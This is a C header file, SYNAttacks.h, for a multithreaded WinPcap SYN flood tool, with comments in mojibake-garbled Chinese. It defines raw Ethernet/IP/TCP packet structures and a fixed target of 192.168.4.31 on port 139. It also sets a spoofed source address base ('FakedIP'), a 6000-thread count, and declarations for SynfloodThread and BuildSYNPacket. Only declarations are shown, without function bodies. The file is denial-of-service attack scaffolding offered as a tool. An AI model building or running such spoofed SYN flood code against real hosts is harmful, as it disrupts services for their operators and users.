//����winpcapʵ��SYN��ˮ���������ٶ���߳�
//SYNAttacks.h

#ifndef MY_SYNATTACKS_INCLUDE_H 
#define MY_SYNATTACKS_INCLUDE_H 

#include <stdio.h> 

#define HAVE_REMOTE			//release�汾ʹ��
#include "pcap.h" 

#include <windows.h>
#include <shellapi.h>

#include <conio.h> 
#include <packet32.h> 
#include <ntddndis.h> 
#include <string.h>
#include <process.h>
#include <winbase.h>
#include  <time.h>
#include <tchar.h>

#pragma  comment(lib,"Shell32.lib")
#pragma  comment(lib,"ws2_32.lib")
#include "MyIpHlp.h"

//�ڴ�������ñ�����1 
#pragma pack (1) 
//#define DATALENTH 6
#define OPTION_LENTH		6

#define  IPMAX			16777217

#define srcIPAddr			"1.0.0.1"//""
#define destIPAddr		"192.168.4.31"

#define destToPort		139

int MAXTHREAD = 6000;				//�߳�����

HANDLE hMutex;

int CNT = 0;
typedef struct et_header					//��̫��ͷ��
{
    unsigned char   eh_dst[6];				//Ŀ�ĵ�ַ 48bit 6�ֽ� ����������ַ
    unsigned char   eh_src[6];				//Դ��ַ 48bit 6�ֽ� ����������ַ
    unsigned short  eh_type;				//0800 IP���ݱ� �� 0806 ARP �� 8035 RARP
}ET_HEADER;

typedef struct ip_hdr							//����IP�ײ�
{
    unsigned char       h_verlen;				//�汾���ײ�����
    unsigned char       tos;						//���ַ���
    unsigned short      total_len;				//�ܳ���
    unsigned short      ident;					//��ʶ
    unsigned short      frag_and_flags;		//3λ�ı�־��13λ��Ƭƫ��
    unsigned char       ttl;						//����ʱ��
    unsigned char       proto;					//Э��
    unsigned short      checksum;			//�ײ�У���
    unsigned int			sourceIP;				//ԴIP
    unsigned int			destIP;					//Ŀ��IP
}IP_HEADER;

typedef struct tcp_hdr							//����TCP�ײ�
{
    unsigned short    th_sport;				//16λԴ�˿�
    unsigned short    th_dport;				//16λĿ�Ķ˿�
    unsigned int    th_seq;						//32λ���к�
    unsigned int    th_ack;						//32λȷ�Ϻ�
    unsigned short  th_data_flag;			//4λ�ײ�����/6λ��־λ ���Ա�����
    unsigned short    th_win;					//16λ���ڴ�С 
    unsigned short    th_sum;					//16λ2У��� 
    unsigned short    th_urp;					//16λ��������ƫ����
	unsigned int     option[OPTION_LENTH];			//��ѡ��
}TCP_HEADER;


typedef struct psd_hdr							//����TCPα�ײ�
{
    unsigned long    saddr;						//Դ��ַ
    unsigned long    daddr;						//Ŀ�ĵ�ַ 
    char            mbz;
    char            ptcl;								//Э������
    unsigned short    tcpl;						//TCP����
}PSD_HEADER;


typedef struct _SYN_PACKET				//������̫����װ��ʽ
{ 
	ET_HEADER eth;								//��̫��ͷ�� 
	IP_HEADER iph;									//IP���ݰ��ײ�  20�ֽ�
	TCP_HEADER tcph;							//tcp���ݰ�ͷ�� 20�ֽ�
	//unsigned char filldata[DATALENTH];   //����ַ�  tcp����
}SYN_PACKET; 
SYN_PACKET packet;

//���ݸ��̵߳Ĳ�����
typedef struct _PARAMETERS
{
	unsigned int        sourceIP;						//Դ��ַ
    unsigned int        destIP;							//Ŀ�ĵ�ַ
	unsigned short      destPort;						//Ŀ��port
	unsigned char       *srcmac;						//Դmac
	unsigned char       dstmac[6];					//Ŀ��mac
	pcap_t              *adhandle;						//pcap�ṹ
}PARAMETERS,*LPPARAMETERS;
 

#pragma pack () 
/** 
* ���������MAC��ַ 
* pDevName �������豸���� 
*/ 
unsigned char* GetSelfMac(char* pDevName); 
/** 
* ��װARP����� 
* source_mac	ԴMAC��ַ 
* srcIP				ԴIP 
* destIP			Ŀ��IP 
*/ 
unsigned char* BuildSYNPacket(unsigned char* source_mac, unsigned char* dest_mac,
							  unsigned long srcIp, unsigned long destIp,unsigned short dstPort); 
unsigned short CheckSum(unsigned short * buffer, int size);
DWORD WINAPI SynfloodThread(LPVOID lp);

void getMASKMAC();
void getNetworkCard();
void getInput(int argc,char *argv[]);
void creatSleep();

pcap_if_t	* alldevs = NULL;							//ȫ�������б� 
pcap_if_t  * d = NULL;									//һ������ 
pcap_addr_t *pAddr;							//������ַ 
int inum;											//�û�ѡ���������� 
char errbuf[PCAP_ERRBUF_SIZE];		//���󻺳��� 
int cards = 0;									//��������
unsigned long sum =0;					//���Ͱ�����

//�̱߳���
PARAMETERS paraforthread;
HANDLE	*threadhandle = NULL;

//��ȡMAC����
char G_device_name[250]="\\Device\\NPF_";//����Ϊ12
char G_device_mac[6];				//����mac
char G_dst_mac[6];					//Ŀ�Ļ���mac����Ŀ�Ļ������� �������ص�macc
unsigned long G_gateway_ip;		//����ip
unsigned long G_device_netmask;//��������
unsigned long G_device_ip;			//����ip
unsigned long G_dst_ip;				//Ŀ�ĵ�ip
const char * maskBase = "255.255.255.255";				//mask����
unsigned long FakedIP;						//α��IP��ַ�Ļ���
long ips;								//IP����

//�߳�ֹͣ 
#define SECOND	1000
unsigned long  stopTime = SECOND;
bool stopFlag = false;	
HANDLE	*sleepthreadhandle = NULL;			//ֹͣ�߳�
DWORD WINAPI SleepThread(LPVOID lp)	;		//sleep �̵߳��ú���
#endif 
